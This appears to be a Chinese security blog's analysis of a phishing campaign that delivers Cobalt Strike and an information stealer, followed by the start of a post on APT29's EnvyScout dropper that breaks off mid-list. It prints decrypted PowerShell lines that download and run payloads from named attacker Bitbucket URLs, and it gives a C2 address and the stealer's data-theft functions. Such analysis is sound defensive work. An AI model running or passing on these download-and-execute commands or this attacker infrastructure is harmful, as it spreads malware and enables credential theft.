远程模板</h3><p>&emsp;&emsp;打开accounting.docx时从公共文件托管服务器bucket上下载恶意模板文件，下载的模板链接如下图:</p><p><img src="54e506a9/b4c06476902081af355df7c283a864ce.png"></p><p>&emsp;&emsp;模板中包含的恶意宏如下图，解密后为执行powershell命令从服务器上下载恶意程序。</p><p><img src="54e506a9/316846f349b7c719f5060d2f1d2ae12d.png"></p><p>解密后的powershell指令如下, 功能为从bitbucket下载恶意程序并执行。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden</span></span><br><span class="line"> -command (New-Object System.Net.WebClient).DownloadFile(&#x27;hxxps://bitbucket.org/clouchfair/oneproject/downloads/licsoftware.exe&#x27;,&#x27;sfrrd234.exe&#x27;);Start-Process &#x27;sfrrd234.exe&#x27;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-Stage3-licsoftware-exe"><a href="#3-Stage3-licsoftware-exe" class="headerlink" title="3.Stage3 licsoftware.exe"></a>3.Stage3 licsoftware.exe</h3><p>&emsp;&emsp;恶意程序为x64的可执行程序，由Stage通过powershell从公共服务器bitbucket下载并保存为文件名”sfrrd234.exe”，主要功能解密下一阶段的文件并执行。</p><h4 id="1-获取模块加载地址"><a href="#1-获取模块加载地址" class="headerlink" title="1.获取模块加载地址"></a>1.获取模块加载地址</h4><p>&emsp;&emsp;恶意程序从PEB的相关结构中获取模块的加载地址，详细解析过程如下:</p><p><strong>获取PEB地址</strong></p><p>&emsp;&emsp;寄存器GS指向的内存地址中偏移48为TEB结构体地址, 其中偏移0x60为PEB地址。</p><p><img src="54e506a9/985508d62ec04995f07eabb15427b122.png"></p><p><strong>获取LDR结构</strong></p><p>&emsp;&emsp;获取peb中的字段Ldr地址,Ldr中保存着所有已加载的模块的相关信息。</p><p><img src="54e506a9/2015fa6d334b955e5d21408443773d0c.png"></p><p><strong>获取链表InLoadOrderModuleList</strong></p><p>&emsp;&emsp;Ldr的字段InLoadOrderModuleList为双链表结构，链表指向的结构体为_LDR_MODULE,该结构体保存着模块名和模块加载地址等信息。<br>&emsp;&emsp;恶意程序遍历该链表, 获取已加载模块并计算hash值然后与指向的hash进行比较,如果匹配则返回模块的加载地址。</p><p><img src="54e506a9/3e08182a18478f51a668fd67d298f62c.png"></p><h4 id="2-解析API地址"><a href="#2-解析API地址" class="headerlink" title="2.解析API地址"></a>2.解析API地址</h4><p>&emsp;&emsp;恶意程序通过解析对应文件的导出表来获取对应API的函数地址。获取函数地址时使用多个函数来获取PE结构中的不同部分。详细解析过程如下。</p><p><strong>获取lpfanew：</strong></p><p>&emsp;&emsp;读取偏移0x3C处的偏移值用于定位PE结构的NT头部。</p><p><img src="54e506a9/a3905832d105143120da02330aa5c3aa.png"></p><p><strong>获取导入表地址</strong></p><p>&emsp;&emsp;偏移0x88为PE结构中导出表到NT头部的偏移，读取该值计算导出表的地址。</p><p><img src="54e506a9/e1a58d7d9e2d9faa376b9396628d0fd2.png"></p><p><strong>保存模块加载地址和导入表地址</strong></p><p>&emsp;&emsp;使用64位来保存相关数据，其中高32为保存导出表地址,低32位保存模块加载地址。</p><p><img src="54e506a9/64f06d3da0e5ee5d8259f7d86bc2ecc7.png"></p><p><strong>获取指定序号的API函数名</strong></p><p>&emsp;&emsp;字段AddressOfName所指向的数据字符串数组，在这里存放着程序要导出的所有函数名,通过序号来获取指定序号的API函数名。</p><p><img src="54e506a9/a0b09a3eead7e82bc5dc7bc42b803afd.png"></p><p><strong>获取指定序号的API函数地址</strong></p><p>&emsp;&emsp;这里逻辑比较简单，先使用序号从结构addressOfNameOrigin获取指定序号的RVA,然后再使用该RVA从addrOfFunction获取函数地址。</p><p><img src="54e506a9/d7a631d3c23b32fef351dda16084ae14.png"></p><p><strong>Hash计算</strong></p><p>&emsp;&emsp;得到函数名后,对函数名计算hash值。计算方法为读取函数名的每个字符，并对字符进行异或计算。</p><p><img src="54e506a9/288fbd84b2a496e0ff876a2174a7d243.png"></p><p>对字符异或代码如下:</p><p><img src="54e506a9/1eaa4ae1a9367723ffa455baa986f1cb.png"></p><p>使用伪代码描述如下:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">Uint32_t</span> <span class="function"><span class="title">gen_hash</span>(<span class="variable">char</span>* <span class="variable">name</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">Uint32_t</span> <span class="variable">len</span>=<span class="function"><span class="title">strlen</span>(<span class="variable">name</span>);</span></span><br><span class="line"><span class="function"><span class="variable">Hash</span> = <span class="number">0</span><span class="variable">x0x811C9DC5</span>;</span></span><br><span class="line"><span class="function"><span class="title">For</span>(<span class="variable">uint32_t</span> <span class="variable">i</span>=<span class="number">0</span>;<span class="variable">i</span>&lt;<span class="variable">len</span>;<span class="variable">i</span>++)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">Hash</span> = <span class="number">0</span><span class="variable">x1000193</span>*( <span class="variable">Hash</span> ^ <span class="variable">name</span>[<span class="variable">i</span>])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>获取导出函数地址</strong></p><p>&emsp;&emsp;从序号0开始获取对应到处序号的函数名,然后使用该函数名计算hash值，并与硬编码的hash进行比较，如果不相等继续遍历和计算下一个函数名的hash值；如果相等，则通过序号来获取对应函数的函数地址。</p><p><img src="54e506a9/bf13c0cb7d3b0d6aa56b8fd326c36cae.png"></p><h4 id="2-调用解密后的恶意程序"><a href="#2-调用解密后的恶意程序" class="headerlink" title="2.调用解密后的恶意程序"></a>2.调用解密后的恶意程序</h4><p>&emsp;&emsp;恶意程序解密完成和手动加载完后，计算其入口点地址并直接跳转到入口点执行恶意dll的代码。<br><img src="54e506a9/b1b11143a9dba39d9a9f85cdd378eb36.png"></p><h3 id="4-Stage4-内存加载的dll"><a href="#4-Stage4-内存加载的dll" class="headerlink" title="4.Stage4 内存加载的dll"></a>4.Stage4 内存加载的dll</h3><p>&emsp;&emsp;该阶段的payload文件类型为x64版本的dll,由GoLang编译而成。和一般的恶意程序不一样，该样本通过BananaPhone框架来直接调用Windows内核API。<br>&emsp;&emsp;BananaPhone利用”天堂之门”的相关技术使用系统调用来调用内核API,因此可以绕过一些安全防护软件在用户层对一些关键的系统API所作的hook。<br>&emsp;&emsp;该文件的主要功能是创建posershell进行并执行powershell代码然后自删除。在powershell下载下一阶段的文件并调用rundll执行其导出函数。执行的powershell代码如下:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[net.servicepointmanager]</span>::securityprotocol = </span><br><span class="line"><span class="selector-attr">[net.securityprotocoltype]</span>::tls12</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$env</span>:temp + <span class="string">&quot;\\lRthax.png&quot;</span></span><br><span class="line"><span class="variable">$client</span> = new-<span class="selector-tag">object</span> system<span class="selector-class">.net</span><span class="selector-class">.webclient</span></span><br><span class="line"><span class="variable">$client</span><span class="selector-class">.downloadfile</span>(<span class="string">&quot;https://bitbucket.org/clouchfair/oneproject/downloads/strymon.png&quot;</span>, <span class="variable">$path</span>)</span><br><span class="line">start-process -filepath <span class="string">&quot;c:\\windows\\system32\\rundll32.exe&quot;</span> -argumentlist <span class="variable">$path</span>, default -windowstyle hidden</span><br></pre></td></tr></table></figure><h4 id="1-解密字符串"><a href="#1-解密字符串" class="headerlink" title="1.解密字符串"></a>1.解密字符串</h4><p>&emsp;&emsp;不同加密字符串在恶意程序可能使用不同的解密算法,算法相同时使用的异或密钥也可能不一样。</p><ol><li> 第一种是加密数据存放在字节数组中，一次从字符数组取出数据然后对其异或解密。<br><img src="54e506a9/5e86685f5ae9853ed28c03843073add6.png"></li></ol><p>2.第二种用slice类型存放解密后的数据，解密方法为边异或解密边往slice插入待解密的数据。<br><img src="54e506a9/8234674217d5cb668caf88fd9979d53c.png"></p><h3 id="4-Stage5-strymon-png"><a href="#4-Stage5-strymon-png" class="headerlink" title="4.Stage5: strymon.png"></a>4.Stage5: strymon.png</h3><p>&emsp;&emsp;该阶段的样本为此次攻击活动中最终投递的payload,属于cobaltstrike后门，该样本使用的API函数解析和PE文件解密与Stage3类似。恶意程序被加载后在dllmain函数中执行解密操作, 在导出函数执行解密后的代码。</p><h2 id="美国联邦政府承包商合作主题钓鱼"><a href="#美国联邦政府承包商合作主题钓鱼" class="headerlink" title="美国联邦政府承包商合作主题钓鱼"></a>美国联邦政府承包商合作主题钓鱼</h2><p>&emsp;&emsp;查看文档元数据可以看出文件的创建事件为**2022-05-06T02:33:00Z,**与使用PSA Plus招聘主题钓鱼中使用的文档创建时间一模一样，可以猜测两次活动中使用的诱饵文档由同一个基础文件根据最新时事而创建，可以断定这两次攻击行动为同一组织所为。</p><p><img src="54e506a9/13f0ba13a8632680d3da2eb9a9a40aa9.png"></p><p>文档打开后具体内容如下:</p><p><img src="54e506a9/9b21e70733a477de55c846452dd8e019.png"></p><h3 id="1-流程图-1"><a href="#1-流程图-1" class="headerlink" title="1.流程图"></a>1.流程图</h3><p><img src="54e506a9/84cef6d621b6fa9145733a1d053149e2.png" alt="图示 描述已自动生成"></p><h3 id="1-Stage2-远程模板"><a href="#1-Stage2-远程模板" class="headerlink" title="1.Stage2 远程模板"></a>1.Stage2 远程模板</h3><p>&emsp;&emsp;打开文档时从公共文件托管服务器bucket上下载恶意模板文件，下载的模板链接如下图:</p><p><img src="54e506a9/73ba48b9b97d4d5e4efd0bdb7b3a6e8d.png"></p><p>&emsp;&emsp;模板中包含的恶意宏如下图，解密后为混淆VBS脚本。调用函数GetObjct使用的参数解密后为”new:9ba05972-f6a8-11cf-a442-00a0c90a8f39”, clsid为”ShellWindows”对象，恶意宏代码使用该com对象来执行解密后的文件。</p><p><img src="54e506a9/6ecbb2e8674c33d00012d14b5588ea96.png"></p><h3 id="2-Stage3-混淆VBS脚本"><a href="#2-Stage3-混淆VBS脚本" class="headerlink" title="2.Stage3 混淆VBS脚本"></a>2.Stage3 混淆VBS脚本</h3><p>&emsp;&emsp;Stage2中恶意宏代码解密后为HTA文件，在标签Script中嵌入一段的混淆vbs代码，当该hta文件被打开时,vbs脚本解密出下一阶段需要执行的powershell代码。</p><p><img src="54e506a9/36dbfeec8508bbf5103f47e0a619d56a.png"></p><h3 id="3-Stage4-混淆powershell脚本"><a href="#3-Stage4-混淆powershell脚本" class="headerlink" title="3.Stage4 混淆powershell脚本"></a>3.Stage4 混淆powershell脚本</h3><p>&emsp;&emsp;使用AES+base64解密混淆数据，解密后为另一段混淆的powershell脚本。</p><p><img src="54e506a9/525f3a138034a53723963491e5359403.png"></p><h3 id="4-Stage5混淆powershell脚本"><a href="#4-Stage5混淆powershell脚本" class="headerlink" title="4.Stage5混淆powershell脚本"></a>4.Stage5混淆powershell脚本</h3><p>&emsp;&emsp;该阶段的powershell脚本与Stage4的脚本类似,函数使用混淆名称,关键字符串使用加密形式。</p><p><img src="54e506a9/47a79734d90a8272cbae07050bdfbd3e.png"></p><p>&emsp;&emsp;字符串解密方法比较简单,将数组内的每一个整数减去52201的值转成字符并拼接为字符串。</p><p><img src="54e506a9/5b360a7ccbb396263b16e9ad20149619.png"></p><p>&emsp;&emsp;Powershell通过判断文件名扩展名来使用不同的方法来执行下载的palyload。</p><p>&emsp;&emsp;对于dll文件可使用rundll32启动,指定要执行的dll导出函数为Default，msi文件使用以静默的方式启动。对于exe文件和其他脚本类型的文件则通过powershell命令Start-Process来启动。</p><p><img src="54e506a9/ccb188398829b6f1978e27a5cc0859a5.png"></p><p>&emsp;&emsp;首先判断文件”newmodule.dll”是否存在路径%temp%中,如果存在则使用rundll32来启动dll文件，否则从文件下载链接中下载文件并保存到临时目录。</p><p><img src="54e506a9/3c103b5e0915d6a501d492c60244bfee.png"></p><p>&emsp;&emsp;通过powershell命令获取newmodeler.dll文件属性, 通过参数-bor 将属性值设置为隐藏。</p><p><img src="54e506a9/7ed3964a80b37b233f3f696cb9ed0350.png"></p><h3 id="5-Stage6-newmodeler-dll"><a href="#5-Stage6-newmodeler-dll" class="headerlink" title="5.Stage6 newmodeler.dll"></a>5.Stage6 newmodeler.dll</h3><p>&emsp;&emsp;该恶意程序为混淆的x64 dll文件,混淆方式与主题1的Stage4样本的混淆方式一致，这里就不再过多分析其使用的混淆技术，分析代码中实现的功能为主。</p><h4 id="1-反调试技术"><a href="#1-反调试技术" class="headerlink" title="1.反调试技术"></a>1.反调试技术</h4><p>&emsp;&emsp;在程序运行中使用多种反调试技术来检测自身是否处于调试状态，如果检测到自身被调试,则退出程序不再进行后续操作。</p><ul><li>  使用windows API检测相关调试相关的标志位</li></ul><p><img src="54e506a9/90ddb0796b091226c7a5e262dc2b0f03.png"></p><ul><li><p>设置TEB的字段LastErrorValue的值为0达到反调试目的</p><p>  <img src="54e506a9/8a955fbc616293d9e0ce0705e5dd923e.png"></p></li><li><p>使用NtDelayExecution 检测调试状态</p><p>  <img src="54e506a9/c1ad0e15a7190e3635d04e6ef987c629.png"></p></li></ul><h4 id="2-检测沙箱相关文件"><a href="#2-检测沙箱相关文件" class="headerlink" title="2.检测沙箱相关文件"></a>2.检测沙箱相关文件</h4><p>&emsp;&emsp;通过GetModuleHandle来检测是否加载了一些与沙箱相关的模块。</p><p><img src="54e506a9/ea715e59145e8f2db7a09d1fc940ebdc.png"></p><h3 id="6-Epicritic"><a href="#6-Epicritic" class="headerlink" title="6. Epicritic"></a>6. Epicritic</h3><h4 id="1-字符串解密"><a href="#1-字符串解密" class="headerlink" title="1.字符串解密"></a>1.字符串解密</h4><p>&emsp;&emsp;恶意程序内部大部分字符串都是加密字符串,加密方式为先将字符串base64编码后,编码后的字符依次与异或密钥的字符进行异或然后拼接成新的字符串,最后再次base64编码获得加密字符串。这个异或密钥为”Stripped”。</p><p><img src="54e506a9/f89b070e8eb1a959a042a26e723eaf75.png" alt="文本 描述已自动生成"></p><h4 id="3-配置信息"><a href="#3-配置信息" class="headerlink" title="3.配置信息"></a>3.配置信息</h4><p>&emsp;&emsp;恶意程序在类Arguments中硬编码了在窃取数据使用的类型和字符串解密时使用的密钥，其中Version指定窃取哪些数据，IP为远程&amp;C&amp;服务器IP,在这里为加密状态,解密后为”185.17.0.63:34397”。</p><p><img src="54e506a9/399cd6bb48e814042347a572c0ca5761.png"></p><h4 id="2-执行环境检测"><a href="#2-执行环境检测" class="headerlink" title="2.执行环境检测"></a>2.执行环境检测</h4><p>&emsp;&emsp;恶意程序在启动时会检测受害者操作系统所使用的语言来判断是否窃取受害者的用户资料。由此可知攻击者只针对特定区域的用户进行数据窃取。</p><p><img src="54e506a9/5c7df8e03dddafbad9837513493adc54.png"></p><h4 id="3-C-amp-C通信"><a href="#3-C-amp-C通信" class="headerlink" title="3.C&amp;C通信"></a>3.C&amp;C通信</h4><p>&emsp;&emsp;恶意程序在最近的几个版本将通信协议HTTP协议改成Net.TCP协议的改变,使得安全研究员对C&amp;C通信相关的数据包分析和调查变得更加困难。<br>&emsp;&emsp;这可能导致安全研究人员耗费更多的时间去分析,也能够绕过基于网络数据包过滤的防火墙等系统。<br>&emsp;&emsp;使用Net.TCP协议时C&amp;C通信内容难以被理解，从而允许恶意程序在受害者在不知情的情况下进行恶意活动。</p><p>&emsp;&emsp;Net.TCP协议基于MC-NMF(.Net消息) ，它尤其是一种高效传输 SOAP数据的机制，使其成为双向通信的理想且非常灵活的协议。 Redline 利用这种机制与其C2服务器进行通信。</p><p>&emsp;&emsp;如下图所示,恶意程序将C&amp;C服务地址与本地进行绑定。其中Entity为C&amp;C服务暴露给外部的接口。<br><img src="54e506a9/c6e5a3fa92acc06fbb73d9d035cfdd2e.png"></p><p>恶意程序创建一个服务契约Entity, 服务契约定义了远程访问对象和可供调用的方法。<br><img src="54e506a9/dd0a41289a44870b95e47ada8c23e485.png"></p><p>其中每个方法的描述如下:</p><table><thead><tr><th>函数名</th><th>描述</th></tr></thead><tbody><tr><td>Id1</td><td>发送上线包</td></tr><tr><td>Id2</td><td>获取数据泄露配置</td></tr><tr><td>Id3</td><td>收集用户名</td></tr><tr><td>Id5</td><td>未知</td></tr><tr><td>Id6</td><td>未知</td></tr><tr><td>Id7</td><td>收集机器已安装语言</td></tr><tr><td>Id8</td><td>收集机器已安装软件</td></tr><tr><td>Id9</td><td>收集机器当前运行进程</td></tr><tr><td>Id10</td><td>收集硬件信息</td></tr><tr><td>Id11</td><td>收集已安装软件</td></tr><tr><td>Id12</td><td>收集已安装FTP</td></tr><tr><td>Id13</td><td>发送已安装浏览器信息</td></tr><tr><td>Id14</td><td>未知</td></tr><tr><td>Id15</td><td>未知</td></tr><tr><td>Id16</td><td>未知</td></tr><tr><td>Id17</td><td>未知</td></tr><tr><td>Id18</td><td>发送NordVPN数据</td></tr><tr><td>Id19</td><td>发送泄露的ProtohVPN数据</td></tr><tr><td>Id20</td><td>发送Telegram数据</td></tr><tr><td>Id21</td><td>发送Discord token</td></tr><tr><td>Id22</td><td>泄露数据已成功发送</td></tr><tr><td>Id23</td><td>从C&amp;C服务器接收任务</td></tr><tr><td>Id24</td><td>发送任务完成消息</td></tr></tbody></table><p>另外还定义了Enity1~Entity17等多种数据契约,数据契约为服务端和客户端之间要传送的自定义数据类型。<br><img src="54e506a9/76a5f4f3e4bbbc88722756bb30a0c19f.png"></p><p>每个数据契约对象的描述如下表</p><table><thead><tr><th>对象名</th><th>描述</th><th>结构</th></tr></thead><tbody><tr><td>Entity1</td><td>保存所有泄露数据</td><td></td></tr><tr><td>Entity2</td><td>设置</td><td></td></tr><tr><td>Entity3</td><td>保存系统信息</td><td></td></tr><tr><td>Entity4</td><td>安装的浏览器</td><td>Id1: 未知 Id2: 浏览器名 Id3: 浏览器版本</td></tr><tr><td>Entity5</td><td>Discord token数据</td><td></td></tr><tr><td>Entity6</td><td>updateTask</td><td></td></tr><tr><td>Entity7</td><td>系统信息</td><td></td></tr><tr><td>Entity8</td><td>浏览器信息</td><td>Id1:浏览器名 Id2: 浏览器版本号</td></tr><tr><td>Entity9</td><td>保存浏览器配置文件</td><td></td></tr><tr><td>Entity10</td><td></td><td></td></tr><tr><td>Entity11</td><td>浏览器中保存的信用卡信息</td><td></td></tr><tr><td>Entity12</td><td>浏览器保存的登录数据</td><td></td></tr><tr><td>Entity13</td><td>枚举值,保存响应结果</td><td></td></tr><tr><td>Entity14</td><td>枚举值</td><td></td></tr><tr><td>Entity15</td><td>接收到task执行的行为</td><td>Id1: 下载文件 Id3: 下载文件并执行 Id4: 启动进程 Id5: 命令行启动进程</td></tr><tr><td>Entity16</td><td>搜索文件时的配置</td><td>ID1: 文件名 ID2: 搜索模式字符 ID5: 搜索ID ID3: 文件搜索选项</td></tr><tr><td>Entity17</td><td>恶意程序配置信息</td><td></td></tr></tbody></table><p>其中部分收集信息的代码如下:</p><ul><li><p><strong>获取处理器信息</strong></p><p>  使用查询查询语言”select * from Win32_Procsessor”来查询处理器信息,<br>  Net.TCP协议中绑定的接口来保存数据,其中Id1存放处理器名,Id2存放处理器的核心数。</p></li></ul><p><img src="54e506a9/291152d3922207e2f6d80a77968928cc.png"></p><ul><li><p>获取显卡数据</p><p>  使用WMI查询语言”select * from Win_VideoController”查询显卡信息,<br>  获取每个显卡的显存大小。</p><p>  <img src="54e506a9/fe5bd948c24ac3b3da1c06b2217ee533.png"></p></li></ul><h4 id="4-数据泄露"><a href="#4-数据泄露" class="headerlink" title="4.数据泄露"></a>4.数据泄露</h4><p>&emsp;&emsp;恶意程序通过服务契约类Id2获取数据泄露配置，配置数据使用数据契约类Entity2来保存泄露的数据。当收到配置数据时，恶意程序根据配置文件来选择性的泄露不同类型的数据。</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>Id1</td><td>收集浏览器cookie</td></tr><tr><td>Id2</td><td>收集openvpn和protohVPN数据</td></tr><tr><td>Id3</td><td>FileZilla登录地址、账号和密码</td></tr><tr><td>Id4</td><td>收集 区块链钱包登录数据</td></tr><tr><td>Id5</td><td>屏幕截图</td></tr><tr><td>Id6</td><td>收集Telegram数据</td></tr><tr><td>Id7</td><td>发送泄露的VPN数据</td></tr><tr><td>Id8</td><td>搜索stream游戏配置</td></tr><tr><td>Id9</td><td>收集Discord token</td></tr></tbody></table><h4 id="5-下发任务"><a href="#5-下发任务" class="headerlink" title="5.下发任务"></a>5.下发任务</h4><p>&emsp;&emsp;恶意程序使用数据契约类Entity6来保存从C&amp;C服务器下发的任务，执行的任务主要有执行进程、下载文件和更新自身。Entity6结构如下,所有成员都被声明为DataContract,表示恶意程序与C&amp;C服务器通信时会将这些数据序列化后再传输。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Entity6</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//任务ID</span></span><br><span class="line">[<span class="meta">DataMember(Name = <span class="string">&quot;Id1&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> Id1 &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"><span class="comment">//任务参数</span></span><br><span class="line">[<span class="meta">DataMember(Name = <span class="string">&quot;Id2&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Id2 &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"><span class="comment">//任务执行的动作</span></span><br><span class="line">[<span class="meta">DataMember(Name = <span class="string">&quot;Id3&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> Entity15 Id3 &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"><span class="comment">//下载连接</span></span><br><span class="line">[<span class="meta">DataMember(Name = <span class="string">&quot;Id4&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Id4 &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;首先从受害者机器上收集系统信息,然后通过服务契约接口方法Id23上传并等待C&amp;C服务器返回任务列表。</p><p><img src="54e506a9/4e26f1647c39d875b980603a5edc43e9.png"></p><p>根据字段Id的不同执行不同的行为, 具体如下:</p><table><thead><tr><th>Id3</th><th>执行动作的类</th><th>参数(Id2)</th><th>描述</th></tr></thead><tbody><tr><td>Entity15.Id5</td><td>CommandLineUpdate</td><td>文件名</td><td>命令行启动进程</td></tr><tr><td>Entity15.Id1</td><td>DownloadUpdate</td><td>{路径}|{下载连接}</td><td>下载文件到指定路径</td></tr><tr><td>Entity15.Id3</td><td>DownloadAndExecuteUpdate</td><td>{下载连接}|{路径}</td><td>下载文件并执行</td></tr><tr><td>Entity15.Id4</td><td>OpenUpdate</td><td>文件名</td><td>使用Process对象启动进程</td></tr></tbody></table><h1 id="ATT-amp-CK矩阵"><a href="#ATT-amp-CK矩阵" class="headerlink" title="ATT&amp;CK矩阵"></a>ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>initial Access</td><td>T1566.001</td><td>Spearphishing</td><td>钓鱼邮件</td></tr><tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>执行powershell命令</td></tr><tr><td></td><td>T1059.003</td><td>Windows Command Shell</td><td>执行cmd命令</td></tr><tr><td></td><td>T1204.002</td><td>Malicious File</td><td>执行恶意文件</td></tr><tr><td></td><td>T1047</td><td>Windows Management Instrumentation</td><td>执行wmi查询</td></tr><tr><td>Defense Evasion</td><td>T1480</td><td>Execution Guardrails</td><td></td></tr><tr><td></td><td>T1083</td><td>File and Directory Discovery</td><td>查找文件和目录</td></tr><tr><td></td><td>T1132.002</td><td>Non-Standard Encoding</td><td>数据编码方式为Base32</td></tr><tr><td>Exfiltration</td><td></td><td>Exfiltration Over C2 Channel</td><td>通过与C&amp;C通信泄露数据</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;最近发现一个恶意活动,该活动使用模块化攻击技术并投递CobaltStrike木马到受害者机器上。攻击者通过携带CVE-2017-0199漏洞的钓鱼邮件，当受害者打开钓鱼邮件时,它会下载托管再攻击者控制的恶意Word文档模板。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;在此次活动中发现了攻击者使用的两种攻击方法,一种时通过远程模板执行嵌入的VBS脚本,从而导致生成和执行其他混淆的VB和Powershell混淆脚本。另一种使用恶意宏代码下载和执行恶意powershell命令和下载恶意程序。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;两种攻击最终都投递CobaltStrike的泄露版本。Bean配置包含执行任意二进制文件和进程注入，并配置了高信誉，使用重定向技术来伪装Beaons的流量。在投递CobaltStrike的同时还投递了其他窃密软件。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CobaltStrike" scheme="http://shxi.cc/tags/CobaltStrike/"/>
    
  </entry>
  
  <entry>
    <title>APT29组织使用DropBox和Google Drive释放恶意负载</title>
    <link href="http://shxi.cc/post/1cc03acb.html"/>
    <id>http://shxi.cc/post/1cc03acb.html</id>
    <published>2024-03-21T01:19:52.000Z</published>
    <updated>2024-03-27T02:52:26.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;APT29又叫Nobelium、CozyBear，归属于俄罗斯,从2008年一直以政府、外交官、政治和智库部门。在最近发现该APT组织开始利用合法软件通过侧加载来加载恶意dll文件，并滥用合法的web服务(比如Dropbox、Google Driver)作为C&amp;C通信达到逃避自动分析软件的检测。</p><h1 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2. 流程图"></a>2. 流程图</h1><img src="/post/1cc03acb/9ebd52394c02a2d5c6ecff777d527339.png" class="" title="example"><span id="more"></span><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h1><p>&emsp;&emsp;此次攻击使用EnvyScout释放器,它是一个嵌入恶意javascript脚本的HTML文件,javascript脚本的主要功能未解密和释放下一阶段的有效负载。一旦HTML文件被指向，JavaScript代码就会解密加密的数据然后将结果存保存到指定目录中。在这种情况下，由受害者手动解压并执行。</p><h2 id="1-PDF诱饵文件"><a href="#1-PDF诱饵文件" class="headerlink" title="1. PDF诱饵文件"></a>1. PDF诱饵文件</h2><p>&emsp;&emsp;该诱饵文件为鱼叉式钓鱼电子邮件中的附件。从PDF内容上看似乎是针对驻巴西的外国大使馆。文中很明显把巴西的英文单词”Brazil”编写错误成”<br>Brzail”。文档中所有的链接都指向同一个URL:”<br><a href="https://porodicno.ba/wp-content/Agenda.html%E2%80%9D%E3%80%82">https://porodicno.ba/wp-content/Agenda.html”。</a> 文件” Agenda.html”是 EnvyScout<br>，一个恶意 HTML 文档。</p><p><img src="1cc03acb/6b211d8bfb74984b145b8a8740c32a9d.png"></p><h2 id="2-EnvyScout"><a href="#2-EnvyScout" class="headerlink" title="2. EnvyScout"></a>2. EnvyScout</h2><p>&emsp;&emsp;EnvyScout是Nobelium独有的恶意程序，主要通过鱼叉式钓鱼电子邮件的附件传递给Nobelium的目标。<br>&emsp;&emsp;EnvyScout为恶意HTML文件, 恶意ISO文件混淆后的数据被硬编码保存到javascript脚本内,当用户访问该html文件时，javascript解密ISO文件并写入到受害者计算机上。<br>&emsp;&emsp;在javascript脚本中变量d保存混淆后的恶意ISO文件数据，解密方法比较简单将变量d中的每一个值减去17后得到一个名为”<br>Agenda.iso”的文件。</p><p>&emsp;&emsp;第一次尝试使用方法msSaveOrOpenBlob来保存恶意ISO文件，如果受害者打开恶意HTML文件的浏览器不支持该方法则采用第二种方法，<br><img src="1cc03acb/487e3cd0909f526252176618974be3e4.png"></p><h2 id="3-dll侧加载"><a href="#3-dll侧加载" class="headerlink" title="3. dll侧加载"></a>3. dll侧加载</h2><p>&emsp;&emsp;当受害者下载并保存了文件”Agenda.iso”,还需要受害者手动解压并执行快捷方式来启动恶意程序。为了迷惑受害者，攻击者使用了测侧加载技术。<br><img src="1cc03acb/aa2ecaa7ccccdf9905497a34f3276fa0.png"></p><p>每个文件的功能如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">_</span> :<span class="type"></span>加密的payload，解密后为一个名为GoogleDriver的恶意程序</span><br><span class="line">agenda.exe : <span class="type"></span>合法文件，”Adobe Create PDF”的插件</span><br><span class="line">vcruntime140.dll：合法文件，VC++运行时库</span><br><span 